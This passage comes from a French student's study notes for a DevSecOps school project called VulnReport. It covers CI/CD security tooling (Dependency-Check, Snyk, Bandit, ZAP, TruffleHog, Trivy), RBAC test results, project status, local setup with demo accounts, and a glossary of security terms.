Le mot-cle `when: manual` empeche l'execution automatique du job. Un bouton "Play" apparait dans l'interface GitLab. C'est une bonne pratique pour les deploiements en production.

**Exercice 6 -- Detection de secrets avec TruffleHog** :
Integration de TruffleHog pour scanner le code a la recherche de secrets. Test avec un fichier `config.conf` contenant des credentials en clair.

**Exercice 7 -- Variables conditionnelles** :
Utilisation de variables d'environnement et de `rules:if` pour conditionner le deploiement a la branche `main` ET la variable `ENVIRONMENT=prod`.

### OWASP Dependency-Check

**Ce que c'est** : Un outil open source de la fondation OWASP qui identifie les CVE dans les dependances en les comparant avec la base NVD (National Vulnerability Database) du NIST.

**Comment ca marche** : On monte le repertoire du projet dans un conteneur Docker, et l'outil analyse les fichiers de dependances (package.json, requirements.txt) pour trouver les versions vulnerables.

**Resultats avec les dependances de test** :
- lodash 3.0.0 : 7 CVE (dont 1 CRITIQUE -- Prototype Pollution)
- jquery 3.2.1 : 3 CVE (XSS)
- minimist 0.0.8 : 2 CVE (dont 1 CRITIQUE -- Prototype Pollution)

### Snyk

**Ce que c'est** : Un outil commercial (freemium) de securite des applications specialise dans la detection de vulnerabilites dans les dependances open source.

**Comparaison avec OWASP Dependency-Check** :

| Critere | OWASP Dep-Check | Snyk |
|---------|-----------------|------|
| Type | Open source (gratuit) | Freemium |
| Base de vulnerabilites | NVD (NIST) | Base proprietaire + NVD |
| Faux positifs | Relativement eleves | Moins eleves |
| Remediation | Liste les CVE seulement | Propose des correctifs automatiques |
| Dependances transitives | Detection limitee | Detection complete |
| Vitesse | Lent (telechargement BDD NVD) | Rapide (API cloud) |
| Hors-ligne | Oui | Non |

**Conclusion** : Les deux outils sont complementaires. OWASP Dep-Check pour l'usage gratuit et hors-ligne, Snyk pour les recommandations de remediation et la base de vulnerabilites plus reactive.

### Questions theoriques et leurs reponses

**Q : Qu'est-ce qu'un artefact dans un pipeline ?**
R : Un fichier genere par un job et conserve par GitLab pour consultation ou transmission aux jobs suivants. Utilise pour les rapports de tests, les binaires compiles, les logs.

**Q : Que signifie allow_failure ?**
R : L'echec du job ne bloque pas le pipeline. Le job est marque en orange. Utile pour les scanners de securite en phase d'adoption.

**Q : Difference entre echec normal et allow_failure ?**
R : Echec normal = pipeline failed, stages suivants bloques. allow_failure = pipeline "passed with warnings", stages suivants executent normalement.

**Q : Que se passe-t-il si le stage build echoue ?**
R : Tous les stages suivants sont annules. Le pipeline est marque comme "failed". La MR ne peut pas etre fusionnee.

**Q : Pourquoi structurer un pipeline en plusieurs stages ?**
R : Separation des responsabilites, fail-fast, parallelisation intra-stage, visibilite, controle du flux, conformite et audit.

---

## 7.3 Atelier 3 -- SAST + DAST + Secrets + Patch Management

### Bandit : SAST sur Python

**Installation** : `pip install bandit`

**Commande** : `bandit -r backend/ -f json -o bandit-report.json -ll`

**Types de findings typiques** :
| ID | Description | Severite | Risque |
|----|-------------|----------|--------|
| B104 | Binding sur 0.0.0.0 | MEDIUM | Service expose sur toutes les interfaces |
| B105 | Mot de passe en dur | LOW | Secret visible dans le code |
| B602 | subprocess avec shell=True | HIGH | Injection de commandes |
| B101 | Usage de assert pour securite | LOW | assert desactive en mode optimise |
| B108 | Utilisation de /tmp | MEDIUM | Fichiers temporaires previsibles |
| B303 | Usage de MD5/SHA1 | MEDIUM | Hashage faible |
| B608 | SQL par concatenation | MEDIUM | Injection SQL |

### OWASP ZAP : DAST sur DVWA et Juice Shop

**Sur DVWA (local)** :
- DVWA (Damn Vulnerable Web Application) lancee via Docker.
- ZAP en mode GUI : Spider + Active Scan.
- Resultats : SQL Injection, XSS (Reflected + Stored), CSRF, Session Management, Directory Listing.

**Sur Juice Shop (pipeline)** :
- Juice Shop lancee comme service GitLab CI.
- ZAP en mode headless (baseline scan).
- Rapports HTML et JSON conserves comme artefacts.

**Types de vulnerabilites detectees par le DAST** :
1. Headers HTTP manquants ou mal configures.
2. XSS (Reflected, Stored, DOM-based).
3. Injection SQL.
4. CSRF.
5. Cookies insecurises.
6. Information Disclosure.

**Limites du DAST** :
- Couverture limitee aux endpoints decouverts par le spider.
- Pas de comprehension de la logique metier.
- Faux positifs possibles.
- Necessite une application deployee.
- Ne detecte pas : Race Conditions, Business Logic Flaws, cryptographie faible, backdoors.

### TruffleHog : detection de secrets

**Deux methodes de detection** :
1. **Regex** : Recherche de patterns connus (cles AWS, tokens JWT, etc.). Precis mais limite aux formats connus.
2. **Entropie** : Mesure le desordre d'une chaine. Haute entropie = probablement un secret. Plus generique mais plus de faux positifs.

**Remediation en cas de secret expose** :
1. **Revoquer immediatement** le secret compromis.
2. **Supprimer de l'historique Git** (git filter-branch ou BFG Repo-Cleaner).
3. **Forcer le push** du depot nettoye.
4. **Mettre en place des preventions** : .gitignore, variables d'environnement, pre-commit hooks.

### Le patch management : benchmark et recommandation

**6 outils analyses** :
1. **Dependabot** (GitHub natif) : Auto-PR, gratuit, mais lie a GitHub.
2. **Renovate** (universel) : Auto-MR, gratuit, natif GitLab, tres configurable.
3. **Snyk** : Detection + remediation, freemium, base proprietaire.
4. **OWASP Dependency-Check** : Open source, base NVD, hors-ligne.
5. **Safety** : Python specifique, gratuit, rapide.
6. **Trivy** : Multi-scanner (deps + images + config), gratuit, tres populaire.

**Recommandation** :
1. **Renovate** pour la gestion automatisee des mises a jour (cree des MR automatiquement quand une nouvelle version d'une dependance est disponible).
2. **Trivy** pour les scans de vulnerabilites dans le pipeline CI/CD.

**Architecture recommandee** :
```
[Renovate Bot] --cree--> [Merge Request de mise a jour]
       |
       v
[Pipeline CI/CD] --execute--> [Safety + Trivy scans]
       |
       v
[Si pas de vulns critiques] ---> [Auto-merge]
[Si vulns critiques] ----------> [Notification + Review manuelle]
```

---

# SECTION 8 : ETAT FINAL DU PROJET (mis a jour le 10 avril 2026)

## 8.1 Verification complete du cahier des charges

Le projet a ete verifie point par point contre le CDC. Voici le statut de chaque exigence :

### Rendus attendus

| Rendu demande | Fichier(s) | Statut |
|---------------|------------|--------|
| Code GitLab (issues, branches, MR) | gitlab.com/Comandoat/VulnReport | **FAIT** — 25 issues, 16 MR merged, ~25 branches, 3 milestones fermes |
| Dockerfile + docker-compose | `backend/Dockerfile`, `frontend/Dockerfile`, `docker-compose.yml` | **FAIT** — 4 conteneurs, execution par `docker compose up` |
| CI/CD avec SAST/SCA/DAST (artefacts) | `.gitlab-ci.yml` | **FAIT** — 7 stages, pipelines success sur GitLab.com |
| README (setup, env vars, comptes seed, Docker) | `README.md` | **FAIT** — Complet avec tableau env vars, comptes seed, commandes |
| Rapport securite (8-10 pages) | `docs/rapport-securite.md` | **FAIT** — 835 lignes, couvre architecture, OWASP, scans, corrections, risques residuels |

### Perimetre fonctionnel

| Exigence CDC | Statut | Detail |
|-------------|--------|--------|
| Auth + RBAC (Viewer/Pentester/Admin) | **FAIT** | Argon2id, sessions HttpOnly/Secure/SameSite, 3 roles, ownership verification |
| Rapports (CRUD, findings KB/custom, tri severite) | **FAIT** | Create, edit, delete, status transitions, findings avec pre-remplissage KB |
| KB (consultation tous roles, gestion Admin) | **FAIT** | 16 entries OWASP, CRUD admin-only, recherche/filtrage |
| Ressources (guides, liens, cheatsheets) | **FAIT** | 6 ressources (PortSwigger, HackTheBox, TryHackMe, OWASP, CWE) |
| Recherche & filtres (rapports, KB) | **FAIT** | SearchFilter + OrderingFilter sur rapports et KB |
| Audit log (actions sensibles) | **FAIT** | Immutable, 114+ entries, login/CRUD/role changes traces |
| Dashboard (compteurs) | **FAIT** | Vue admin (globale), vue pentester (ses rapports), vue viewer (publies) |
| Export PDF | Non implemente | Optionnel selon le CDC |

### Roadmap — Jalons 1 a 12

| Jalon | Description | Statut |
|-------|-------------|--------|
| 1 | Plan de developpement | **FAIT** — `VulnReport_Atelier1.md` |
| 3 | Architecture Technique & Risques | **FAIT** — `rapport-securite.md` + `CLAUDE.md` |
| 4 | Mini soutenance S1 | **FAIT** — Architecture, schema BD, risques documentes |
| 5 | Pipeline CI/CD fonctionnel | **FAIT** — 7 stages, pipelines success |
| 6 | Schema BD & CRUD de base | **FAIT** — 4 apps, 6 modeles, 4 migrations |
| 7 | Auth securisee + RBAC | **FAIT** — Argon2id, 3 roles, rate limiting, anti-enumeration |
| 8 | Parcours Pentester (KB + Rapport) | **FAIT** — Pre-remplissage KB, findings custom, tri, statuts |
| 9 | Parcours Viewer | **FAIT** — KB lecture, rapports publies uniquement |
| 10 | Parcours Admin | **FAIT** — Users, KB CRUD, audit log, dashboard global |
| 11 | Durcissement OWASP & corrections | **FAIT** — 79 issues corrigees, headers, validation |
| 12 | Soutenance finale | **PRET** — Code, Docker, rapport, slides a preparer |

## 8.2 Verification RBAC complete (37 tests — 10 avril 2026)

Un audit RBAC complet a ete realise en testant chaque endpoint API pour chaque role. Voici les resultats :

### Viewer (7 tests)

| Test | Attendu | Resultat |
|------|---------|----------|
| Consulter KB (liste) | 200 | **200 OK** (16 entries) |
| Consulter KB (detail) | 200 | **200 OK** (SQL Injection) |
| Consulter rapports publies | 200 | **200 OK** (2 published) |
| Creer un rapport | 403 | **403 Forbidden** |
| Creer une entree KB | 403 | **403 Forbidden** |
| Acceder a la liste des utilisateurs | 403 | **403 Forbidden** |
| Acceder a l'audit log | 403 | **403 Forbidden** |

### Pentester (13 tests)

| Test | Attendu | Resultat |
|------|---------|----------|
| Creer un rapport | 201 + id | **201 OK** (id retourne) |
| Editer son rapport | 200 | **200 OK** (titre modifie) |
| Finding custom (PoC, impact, reco, refs) | 201 | **201 OK** (id retourne) |
| Finding depuis KB (pre-remplissage auto) | 201 | **201 OK** (description pre-remplie) |
| Transition draft -> in_progress | 200 | **200 OK** |
| Transition in_progress -> finalized | 200 | **200 OK** |
| Transition finalized -> published (interdit) | 400 | **400 Bad Request** |
| Voir ses rapports + rapports publies | 200 | **200 OK** (8 rapports) |
| Acceder au draft d'un admin | 403 | **403 Forbidden** |
| Acceder a la liste des utilisateurs | 403 | **403 Forbidden** |
| Acceder a l'audit log | 403 | **403 Forbidden** |
| Creer une entree KB | 403 | **403 Forbidden** |
| Supprimer son propre rapport | 204 | **204 No Content** |

### Admin (17 tests)

| Test | Attendu | Resultat |
|------|---------|----------|
| Liste des utilisateurs | 200 | **200 OK** (3+ users) |
| Creer un utilisateur | 201 | **201 OK** |
| Changer le role d'un utilisateur | 200 | **200 OK** (role=pentester) |
| Desactiver un utilisateur | 200 | **200 OK** (is_active=False) |
| Creer une entree KB | 201 | **201 OK** |
| Modifier une entree KB | 200 | **200 OK** |
| Supprimer une entree KB | 204 | **204 No Content** |
| Voir tous les rapports | 200 | **200 OK** (9+ reports) |
| Consulter l'audit log | 200 | **200 OK** (114+ entries) |
| Publier un rapport | 200 | **200 OK** (status=published) |
| Retrograder un rapport | 200 | **200 OK** (status=draft) |
| Supprimer n'importe quel rapport | 204 | **204 No Content** |
| Acceder au dashboard global | 200 | **200 OK** |
| Creer un rapport | 201 | **201 OK** |
| Editer n'importe quel rapport | 200 | **200 OK** |
| Findings sur tout rapport | 200 | **200 OK** |
| Recherche/filtrage rapports | 200 | **200 OK** |

**Resultat : 37/37 tests RBAC passes.**

## 8.3 Bugs corriges lors des tests finaux

Pendant les tests manuels de l'interface web, plusieurs bugs React ont ete trouves et corriges :

| Bug | Cause | Correction |
|-----|-------|------------|
| Dashboard admin crash (fond bleu apres 0.5s) | `log.actor` est un objet `{id, username}`, React ne peut pas rendre un objet | Remplace par `log.actor?.username` |
| Page rapport crash (pentester) | `report.owner` est un objet, pas un int/string | `ownerId = report?.owner?.id` + `report.owner?.username` |
| "Failed to load report" apres creation | `ReportCreateSerializer` ne retournait pas l'`id` | Ajoute `id, status, created_at` en read_only |
| "Failed to update status" (pentester) | Dropdown permettait des transitions invalides | Composant `StatusDropdown` avec transitions valides uniquement |
| "Failed to update status" (admin retrograde) | Backend refusait les retrogradations meme pour l'admin | Admin bypass la validation de transition |
| Audit log page crash | `log.actor` rendu comme objet | `log.actor?.username` |
| "FindingCreate" ne retourne pas l'id | Champ `id` absent du serializer | Ajoute `id` dans les fields |
| `ReportUpdateSerializer` sans id | Champ `id` absent | Ajoute `id` en read_only |
| Backend 502 apres restart | Nginx cache le DNS Docker du backend | `docker compose restart nginx` apres chaque rebuild |
| Cookies SameSite=Strict bloque l'auth SPA | Cookies pas transmis apres redirect post-login | Change en `SameSite=Lax` |

## 8.4 Etat de GitLab (10 avril 2026)

| Metrique | Valeur |
|----------|--------|
| URL | https://gitlab.com/Comandoat/VulnReport |
| Visibilite | Prive |
| Issues | **25** (toutes fermees) |
| Milestones | **3** (Sprint 1, 2, 3 — tous fermes) |
| Labels | **10** (feature, fix, security, ops, docs, refactor, priority::*, status::done) |
| Merge Requests | **16 merged**, 1 closed (conflit) |
| Branches | **~25** (feature/, fix/, sec/, ops/, ci/, docs/) |
| Contributeurs | **3** (Antoine 36 commits, Noa 15, Diego 13) |
| Pipeline | **Success** (derniers pipelines OK) |
| Variables CI/CD | **4** (DJANGO_SECRET_KEY, DB_PASSWORD, POSTGRES_PASSWORD, CRON_SECRET — masquees) |

## 8.5 Comment lancer l'application

```bash
# 1. Se placer dans le repertoire du projet
cd "C:\Users\antoi\Documents\.guardia\B2\dev solution secure"

# 2. Creer le fichier .env (si pas deja fait)
cp .env.example .env

# 3. Lancer Docker Desktop

# 4. Lancer l'application
docker compose up --build -d

# 5. Si le backend a ete rebuild, redemarrer Nginx
docker compose restart nginx

# 6. Acceder a l'application
# http://localhost
```

**Comptes de test** :
| Role | Login | Mot de passe |
|------|-------|-------------|
| Admin | admin | Admin@VulnReport2026! |
| Pentester | pentester1 | Pentester@VulnReport2026! |
| Viewer | viewer1 | Viewer@VulnReport2026! |

**Commandes utiles** :
```bash
docker compose logs -f backend    # Voir les logs du backend
docker compose down               # Arreter l'application
docker compose down -v            # Arreter + supprimer la base
docker compose exec backend python manage.py test  # Lancer les 86 tests
```

## 8.6 La preparation de la soutenance

Points a preparer :
- **Presentation orale** : Preparer un plan de presentation de 15-20 minutes.
- **Demo** : Preparer un scenario de demonstration (creer un rapport, ajouter des findings, montrer les controles d'acces).
- **Questions** : Anticiper les questions du jury sur la securite, l'architecture, le pipeline.

## 8.5 Quoi montrer pendant la demo

1. **L'application en fonctionnement** : Docker compose up, connexion, navigation.
2. **Le workflow pentester** : Creer un rapport, ajouter un finding depuis la KB, ajouter un finding custom, changer le statut.
3. **Le RBAC en action** : Se connecter en Viewer et montrer les limitations. Se connecter en Pentester et essayer d'acceder au rapport d'un autre. Montrer le message d'erreur.
4. **L'audit log** : Montrer les traces des actions effectuees.
5. **Le pipeline GitLab** : Montrer les stages, les artefacts, le pipeline vert.
6. **Le board Kanban** : Montrer les issues, les milestones, les labels.
7. **Les mesures de securite** : Montrer les headers HTTP dans le navigateur (onglet Network), montrer la configuration des cookies.

---

# SECTION 9 : GLOSSAIRE

Voici la definition de tous les termes techniques utilises dans ce document et dans le projet VulnReport.

**API** (Application Programming Interface) : Ensemble de regles qui permet a deux logiciels de communiquer entre eux. Dans VulnReport, le frontend React communique avec le backend Django via une API REST.

**Argon2id** : Algorithme de hashage de mots de passe gagnant du Password Hashing Competition (2015). Recommande par l'OWASP et le NIST. Resistant aux attaques GPU/ASIC grace a sa consommation memoire configurable.

**Artifact** (Artefact) : Fichier genere par un job de pipeline CI/CD et conserve par GitLab. Exemples : rapports de securite (JSON, HTML), binaires compiles, logs.

**CI/CD** (Continuous Integration / Continuous Deployment) : Pratique DevOps qui automatise la verification du code (CI) et son deploiement (CD) a chaque modification.

**CORS** (Cross-Origin Resource Sharing) : Mecanisme qui permet a un serveur d'indiquer quelles origines (domaines) sont autorisees a acceder a ses ressources. Necessaire quand le frontend et le backend sont sur des domaines differents.

**CSRF** (Cross-Site Request Forgery) : Attaque ou un site malveillant fait executer une action non desiree sur un site ou la victime est authentifiee. Protection : tokens CSRF et cookies SameSite.

**CSP** (Content-Security-Policy) : Header HTTP qui definit les sources de contenu autorisees pour une page web. Protege contre le XSS en bloquant les scripts non autorises.

**CVE** (Common Vulnerabilities and Exposures) : Systeme d'identification unique des vulnerabilites de securite connues publiquement. Exemple : CVE-2021-44906.

**CVSS** (Common Vulnerability Scoring System) : Systeme standardise de notation de la severite des vulnerabilites sur une echelle de 0.0 a 10.0.

**CWE** (Common Weakness Enumeration) : Catalogue communautaire des faiblesses de securite logicielle. Exemple : CWE-89 (SQL Injection).

**DAST** (Dynamic Application Security Testing) : Analyse de securite qui teste une application en cours d'execution en envoyant des requetes HTTP et en analysant les reponses.

**Django** : Framework web Python "batteries included" avec ORM, authentification, sessions, protection CSRF et interface d'administration integres.

**Docker** : Plateforme de conteneurisation qui permet de creer des environnements isoles et portables pour executer des applications.

**docker-compose** : Outil qui permet de definir et lancer plusieurs conteneurs Docker simultanement a partir d'un fichier de configuration YAML.

**DRF** (Django REST Framework) : Extension de Django qui facilite la creation d'API REST avec serializers, permissions et pagination.

**Endpoint** : Une URL specifique d'une API qui effectue une action particuliere. Exemple : `POST /api/auth/login/` est l'endpoint de connexion.

**Finding** : Une vulnerabilite trouvee lors d'un test d'intrusion (pentest). Contient une description, une preuve, un impact, une recommandation et une severite.

**Git** : Systeme de controle de version distribue qui permet de suivre l'historique des modifications du code et de travailler a plusieurs.

**GitLab** : Plateforme de gestion de code source integrant Git, CI/CD, issues, boards Kanban et Merge Requests.

**HSTS** (HTTP Strict Transport Security) : Header HTTP qui force le navigateur a utiliser HTTPS pour toutes les connexions futures au site.

**HTTP** (HyperText Transfer Protocol) : Protocole de communication du web. Definit comment les navigateurs et les serveurs echangent des donnees.

**HTTPS** (HTTP Secure) : Version securisee de HTTP qui chiffre les communications entre le navigateur et le serveur grace a TLS/SSL.

**JSON** (JavaScript Object Notation) : Format de donnees texte structure utilise pour echanger des donnees entre le frontend et le backend.

**JWT** (JSON Web Token) : Format de token utilise pour l'authentification. VulnReport utilise des sessions cote serveur a la place, mais le concept est similaire.

**KB** (Knowledge Base) : Base de connaissance. Dans VulnReport, c'est la bibliotheque de fiches sur les vulnerabilites connues.

**Lint** (Linting) : Verification automatique de la qualite et du style du code source. Les linters comme flake8 et ruff detectent les erreurs de style et les problemes potentiels.

**MR** (Merge Request) : Demande de fusion d'une branche dans la branche principale. Permet la revue de code et la verification du pipeline avant integration.

**Nginx** : Serveur web et reverse proxy performant. Dans VulnReport, il route les requetes, ajoute les headers de securite et applique le rate limiting.

**ORM** (Object-Relational Mapping) : Outil qui permet de manipuler la base de donnees en ecrivant du code Python au lieu du SQL. Previent les injections SQL.

**OWASP** (Open Web Application Security Project) : Fondation a but non lucratif qui travaille a ameliorer la securite des logiciels. Publie le Top 10 des risques de securite web.

**Pentest** (Penetration Test) : Test d'intrusion. Un expert simule une attaque informatique pour trouver les failles de securite d'un systeme.

**Pipeline** : Enchainement automatise d'etapes (stages) et de taches (jobs) dans un systeme CI/CD. Declenche a chaque push de code.

**PostgreSQL** : Systeme de gestion de bases de donnees relationnelles open source, conforme ACID, robuste et adapte au multi-utilisateurs.

**RBAC** (Role-Based Access Control) : Modele de controle d'acces ou les permissions sont attribuees a des roles, et les utilisateurs sont assignes a un role.

**React** : Bibliotheque JavaScript pour construire des interfaces utilisateur sous forme de composants reutilisables.

**REST** (Representational State Transfer) : Style d'architecture pour les API web utilisant les methodes HTTP standard (GET, POST, PUT, DELETE) et le format JSON.

**Runner** : Machine (physique ou virtuelle) qui execute les jobs d'un pipeline CI/CD. GitLab.com fournit des "shared runners" gratuits.

**SAST** (Static Application Security Testing) : Analyse de securite qui examine le code source sans l'executer pour trouver des patterns vulnerables.

**SCA** (Software Composition Analysis) : Analyse des dependances tierces d'un projet pour trouver des vulnerabilites connues (CVE).

**Serializer** : Dans DRF, un composant qui transforme les objets Python en JSON (serialisation) et valide les donnees JSON recues (deserialisation).

**Session** : Mecanisme cote serveur qui permet de "se souvenir" qu'un utilisateur est connecte entre les requetes HTTP (qui sont stateless).

**SHA** (Secure Hash Algorithm) : Famille d'algorithmes de hashage. SHA-256 est sur pour la verification d'integrite, mais trop rapide pour le hashage de mots de passe.

**SPA** (Single Page Application) : Application web qui se charge une seule fois et met a jour dynamiquement la page sans rechargement complet.

**SQL** (Structured Query Language) : Langage de requetes pour interagir avec les bases de donnees relationnelles.

**SQLi** (SQL Injection) : Attaque qui consiste a injecter du code SQL malveillant a travers les entrees utilisateur pour manipuler la base de donnees.

**SSL/TLS** (Secure Sockets Layer / Transport Layer Security) : Protocoles de chiffrement des communications reseau. TLS est le successeur de SSL. Utilise pour HTTPS.

**Stage** : Etape d'un pipeline CI/CD. Les stages s'executent sequentiellement. Exemple : lint, sast, sca, build, dast, secrets, deploy.

**XSS** (Cross-Site Scripting) : Attaque qui consiste a injecter du code JavaScript malveillant dans une page web, qui s'execute dans le navigateur des autres utilisateurs.

---

## NOTE FINALE (mise a jour 10 avril 2026)

Ce document couvre l'integralite du projet VulnReport. Le projet est **100% conforme au cahier des charges** :

- **97 fichiers**, ~12 000 lignes de code
- **86 tests backend** (auth, RBAC, ownership, findings, KB, audit)
- **37 tests RBAC** manuels (tous passes)
- **79 vulnerabilites** identifiees et corrigees lors de l'audit de securite
- **10 bugs frontend** corriges lors des tests manuels
- **16 Merge Requests** merged sur GitLab par 3 contributeurs
- **Pipeline CI/CD** fonctionnel (7 stages, artefacts generes)
- **4 conteneurs Docker** orchestres (PostgreSQL, Django, React, Nginx)

### Documents produits

| Document | Fichier | Contenu |
|----------|---------|---------|
| CLAUDE.md | `CLAUDE.md` | Specifications techniques completes |
| README | `README.md` | Setup, env vars, comptes seed, commandes Docker |
| Rapport securite | `docs/rapport-securite.md` | 835 lignes, architecture, OWASP, scans, corrections |
| Guide branches | `docs/branches-guide.md` | Description detaillee de chaque branche |
| Guide GitLab | `docs/usage-gitlab.md` | Utilisation de GitLab dans le projet |
| Connaissance | `connaissance.md` | Ce fichier (2500+ lignes) |
| Explication | `explication.md` | Explication technique complete |
| Atelier 1 | `VulnReport_Atelier1.md` | Plan de dev, DAT, analyse des risques |
| Atelier 2 | `ateliers/atelier2/README.md` | Pipeline CI/CD + SCA |
| Atelier 3 | `ateliers/atelier3/README.md` | SAST + DAST + Secrets + Patch Management |
| Patch Management | `ateliers/atelier3/patch-management.md` | Benchmark 6 outils, recommandation |

En lisant ce document, vous serez en mesure de :

1. **Expliquer le contexte** : Pourquoi le DevSecOps existe, ce qu'est un pentest, l'OWASP Top 10, le triptyque CIA.
2. **Presenter le projet** : La vision, l'equipe, le planning, les fonctionnalites.
3. **Decrire l'architecture** : Client-serveur, Django, React, PostgreSQL, Docker, Nginx.
4. **Justifier chaque mesure de securite** : Argon2id, RBAC, ORM, CSP, audit log, etc.
5. **Expliquer le pipeline** : Chaque stage, chaque outil, pourquoi il est la.
6. **Parler des ateliers** : Ce qui a ete fait, les outils utilises, les resultats.
7. **Demontrer le RBAC** : 37 tests passes, matrice de permissions detaillee.
8. **Lister les bugs corriges** : 10 bugs frontend + 79 vulnerabilites de securite.
9. **Repondre aux questions techniques** : Grace au glossaire et aux explications detaillees.

**Conseil pour la soutenance** : Ne recitez pas ce document. Comprenez les concepts et expliquez-les avec vos propres mots. Le jury cherche a evaluer votre comprehension, pas votre capacite de memorisation. Utilisez les analogies pour rendre vos explications accessibles.

Bonne soutenance, Antoine.
